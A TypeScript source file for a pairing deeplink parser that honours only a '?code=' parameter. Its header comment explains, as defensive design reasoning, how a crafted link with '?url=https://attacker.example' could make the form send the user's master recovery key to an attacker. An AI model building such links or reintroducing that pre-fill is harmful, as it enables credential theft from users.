/** D-156 P4 — Pair deeplink parser.
 *
 *  Parses `?code=…` (CLI pairing code) from `URLSearchParams` into a
 *  `PairCodeInputDeeplinkSeed` + an `active` flag the bootstrap reads
 *  to decide whether to flip `useNewPairCodeInput` and mount the D-156
 *  P3 form pre-filled. The CLI's `recued-server pair` command emits
 *  the canonical deeplink shape `https://app.recued.com/pair?code=<8-char>`
 *  (D-121 P5 + `backend/server/src/commands/pair.ts`). The webclient's
 *  static shell maps `/pair` path to the same SPA entry as `/` — a
 *  deployment-layer rewrite (Vercel rewrites / nginx `try_files` /
 *  Cloudflare static hosting fallback). The SPA dispatches on the
 *  search params alone, so the path mapping is invisible to this
 *  module; either path lands here if the query is set.
 *
 *  ── Key design decisions (READ before touching) ────────────────────
 *
 *  DD#1 — Only `?code=` is honoured. The earlier `?url=` pre-fill
 *  shape (from the spec's first draft) was dropped during Codex
 *  review on a critical-severity finding: a malicious link
 *  `app.recued.com/pair?url=https://attacker.example&code=...` would
 *  render the official Recued form, pre-fill the attacker's URL, then
 *  POST the user's 24-word master recovery key to `attacker.example`
 *  on submit. Users skim address bars on familiar-looking forms;
 *  pre-filling the destination from a query parameter trades a small
 *  copy-paste convenience (which the CLI doesn't emit anyway — it
 *  prints `?code=` only) for an exfiltration vector against the
 *  master credential. Users type the server URL themselves so the
 *  destination of the recovery-key POST is always self-authored. The
 *  host's `seed.serverUrl` option stays on the type — future flows
 *  (e.g. Settings → Devices "Pair this device" with a trusted
 *  same-origin pre-fill) can populate it via paths that don't carry
 *  the attacker-controlled-URL risk.
 *
 *  DD#2 — `active === true` iff `?code=` carries a non-empty trimmed
 *  value. Empty `?code=` is ignored — the CLI never emits an empty
 *  value, so a bare param is either a typo'd link or an adversarial
 *  probe; treating it as inactive avoids mounting the new form on a
 *  no-op signal. `.trim()` the value so a stray space-after-`=` from
 *  a chat client's URL encoding still resolves.
 *
 *  DD#3 — Pure function over `URLSearchParams | string`. The bootstrap
 *  reads `globalThis.location.search` (a `string`) directly; tests pass
 *  a literal string. No DOM, no globals, no side effects. Returns the
 *  same shape whether `active` or not so callers can spread `seed`
 *  unconditionally if desired.
 *
 *  Spec: D-156
 *  (Phase plan P4). Note: the spec draft mentions `?url=` pre-fill;
 *  Codex review 2026-05-18 P4 caught the exfiltration vector and we
 *  dropped that surface from the parser (spec is IDEA DRAFT, not
 *  normative). */

import type { PairCodeInputDeeplinkSeed } from './pair-code-input-host.js';

export interface ParsedPairDeeplink {
  /** True iff `?code=` is present with a non-empty trimmed value. The
   *  bootstrap reads this to decide whether to flip
   *  `useNewPairCodeInput` + mount the new form on the
   *  `WebclientUnpairedError` fallback path. */
  active: boolean;
  /** Deeplink-seeded pre-fills for the new pair form. Empty object
   *  when `active === false`. `serverUrl` is never populated from the
   *  deeplink — see DD#1. */
  seed: PairCodeInputDeeplinkSeed;
}

/** Parse `?code=…` from a `URLSearchParams` (or raw search string
 *  starting with `?` or not) into a pair-form seed. The bootstrap
 *  typically passes `globalThis.location.search`; tests pass a literal
 *  string. `?url=` is intentionally NOT parsed (see DD#1). */
export const parsePairDeeplink = (
  source: string | URLSearchParams,
): ParsedPairDeeplink => {
  const params =
    typeof source === 'string' ? new URLSearchParams(source) : source;
  const seed: PairCodeInputDeeplinkSeed = {};
  const rawCode = params.get('code');
  const code = rawCode === null ? '' : rawCode.trim();
  if (code.length > 0) {
    seed.pairingCode = code;
  }
  return {
    active: seed.pairingCode !== undefined,
    seed,
  };
};
